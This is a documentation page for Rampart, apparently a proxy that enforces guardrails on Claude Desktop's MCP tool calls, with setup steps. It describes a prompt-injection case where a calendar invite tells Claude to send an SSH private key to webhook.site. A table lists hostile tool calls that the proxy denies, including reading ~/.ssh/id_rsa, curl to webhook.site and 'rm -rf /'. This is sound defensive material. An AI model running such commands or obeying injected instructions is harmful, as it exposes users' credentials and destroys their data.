---
title: Securing Claude Desktop
description: "Protect Claude Desktop MCP tool access with Rampart. Enforce guardrails on filesystem and API actions, and reduce prompt injection-driven exfiltration."
---

# Claude Desktop

Claude Desktop can use MCP servers for filesystem access, databases, APIs, and
more. Rampart evaluates the MCP servers you explicitly route through its local
proxy; built-in and directly connected tools remain outside that boundary.

## The Threat

Claude Desktop processes content from emails, documents, calendar invites, and web pages. Any of these can contain hidden instructions ([prompt injection](https://simonwillison.net/series/prompt-injection/)) that hijack Claude's behavior.

**Example attack:** A calendar invite contains hidden text telling Claude to
read `~/.ssh/id_rsa` and send it to `webhook.site`. If both requested tools are
proxied and match the standard policy, Rampart denies and logs those requests.

## Setup

### 1. Find Your Config

Claude Desktop's MCP config lives at:

| Platform | Path |
|----------|------|
| macOS | `~/Library/Application Support/Claude/claude_desktop_config.json` |
| Linux | `~/.config/Claude/claude_desktop_config.json` |
| Windows | `%APPDATA%\Claude\claude_desktop_config.json` |

### 2. Wrap Your MCP Servers

Replace each MCP server command with `rampart mcp --`:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "rampart",
      "args": ["mcp", "--", "npx", "-y", "@modelcontextprotocol/server-filesystem", "/Users/you/Documents"]
    },
    "github": {
      "command": "rampart",
      "args": ["mcp", "--", "npx", "-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_TOKEN": "ghp_..."
      }
    }
  }
}
```

### 3. Restart Claude Desktop

Quit and reopen. Your MCP servers now route through Rampart.

## What Gets Protected

With the standard policy:

| Attack | Tool Call | Result |
|--------|-----------|--------|
| Credential theft | `read_file("~/.ssh/id_rsa")` | **Denied** |
| Data exfiltration | `execute("curl webhook.site")` | **Denied** |
| Destructive command | `execute("rm -rf /")` | **Denied** |
| Normal file read | `read_file("report.pdf")` | Allowed |
| Normal command | `execute("git status")` | Allowed |

## Local vs Cloud MCP Servers

- **Local servers:** A denied proxied request is stopped before the server sees
  it. Behavior inside an allowed server call is not inspected.
- **Remote servers through a local stdio bridge:** When Claude Desktop launches
  that bridge through `rampart mcp --`, Rampart can deny the proxied request
  before the bridge forwards it. Allowed calls execute remotely.
- **Direct remote connections:** Arbitrary HTTP/SSE MCP connections configured
  directly in the host do not pass through this command-launched stdio proxy.

For cloud MCP servers, use a more restrictive policy (deny by default, explicit allowlist).

## Ask Behavior

When a policy action is `ask`, the proxy creates a request in the running
`rampart serve` queue and holds the call until you resolve it with the dashboard
or `rampart approve <id>` / `rampart deny <id>`, or the request expires. The
proxy waits at most five minutes.
Approval forwards the original request. Denial, expiry, or an unreachable
service returns a JSON-RPC error with code `-32600`. Claude Desktop owns its
own request timeout and may abandon a call that waits longer.

## Monitor

```bash
rampart watch
rampart audit tail --follow
```

## Limitations

- **Built-in tools** (like Claude's code interpreter) don't go through MCP and can't be intercepted.
- **Already-compromised context:** If prompt injection happened in a previous turn, Claude may try alternative approaches when blocked.

See [MCP Proxy](../features/mcp-proxy.md) for the transport and policy details.
